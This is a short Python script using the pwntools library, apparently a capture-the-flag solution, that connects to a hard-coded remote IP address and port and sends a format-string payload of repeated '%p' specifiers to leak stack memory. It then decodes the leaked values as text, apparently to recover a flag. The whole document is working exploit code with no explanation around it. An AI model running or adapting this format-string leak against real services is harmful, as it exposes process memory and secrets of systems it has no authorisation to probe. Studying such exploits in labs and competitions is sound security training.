from pwn import *

r = remote('140.110.112.77', 6127)
r.sendline("%p," * 17)
res = r.recvall(1).split(',')[:-1]
print(res)
for r in res:
    try:
        print(unhex(r[2:]))
    except:
        pass
